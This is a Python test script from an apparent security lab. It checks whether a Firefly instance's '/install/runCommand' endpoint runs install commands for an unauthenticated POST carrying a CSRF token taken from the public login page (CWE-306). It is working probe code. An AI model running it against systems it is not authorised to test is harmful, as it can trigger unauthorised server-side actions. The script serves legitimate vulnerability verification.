#!/usr/bin/env python3
"""
Test Case: Unauthenticated Access to Install Endpoint (V-01)
Checks whether /install/runCommand can be triggered without any
authentication, using only a CSRF token obtained from a public page.

Reference: Lab 2 recon (V-01), Lab 3 AC-04
CWE-306: Missing Authentication for Critical Function, CVSS 9.1
Confirmed by maintainer James Cole.

Expects: the endpoint should require authentication or be blocked
entirely. A 200 response containing install command output means
the vulnerability is present. A 403/401/302/429 means it is protected
(429 indicates the login-page rate limiter itself blocked CSRF
retrieval, which is an acceptable protective outcome for this test).
"""

import os
import sys
import requests
import urllib3
from urllib.parse import unquote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = os.environ.get("FIREFLY_BASE_URL", "http://172.16.24.73")
LOGIN_URL = f"{BASE_URL}/login"
INSTALL_URL = f"{BASE_URL}/install/runCommand"


def get_csrf_token(session):
    resp = session.get(LOGIN_URL, verify=False)
    if resp.status_code == 429:
        return None, 429
    resp.raise_for_status()
    raw_token = session.cookies.get("XSRF-TOKEN")
    return (unquote(raw_token) if raw_token else None), resp.status_code


def main():
    print(f"Target: {INSTALL_URL}")
    print("Obtaining CSRF token from public login page (no authentication)...")

    session = requests.Session()
    csrf, csrf_status = get_csrf_token(session)

    if csrf_status == 429:
        print("\nRESULT: PASS — login page rate limiter blocked CSRF token retrieval (429)")
        sys.exit(0)

    headers = {}
    if csrf:
        headers["X-XSRF-TOKEN"] = csrf

    print("Sending unauthenticated POST to install endpoint...")
    resp = session.post(INSTALL_URL, headers=headers, verify=False)

    print(f"Status: {resp.status_code}")
    print(f"Body: {resp.text[:300]}")

    if resp.status_code == 200 and ("hasNextCommand" in resp.text or "done" in resp.text):
        print("\nRESULT: FAIL — unauthenticated request executed an install command (V-01 present)")
        sys.exit(1)
    elif resp.status_code in (401, 403, 429):
        print("\nRESULT: PASS — endpoint correctly rejected unauthenticated request")
        sys.exit(0)
    elif resp.status_code in (302,) and "login" in resp.headers.get("Location", ""):
        print("\nRESULT: PASS — endpoint redirected to login, authentication required")
        sys.exit(0)
    else:
        print(f"\nRESULT: INCONCLUSIVE — unexpected response, manual review needed")
        sys.exit(2)


if __name__ == "__main__":
    main()
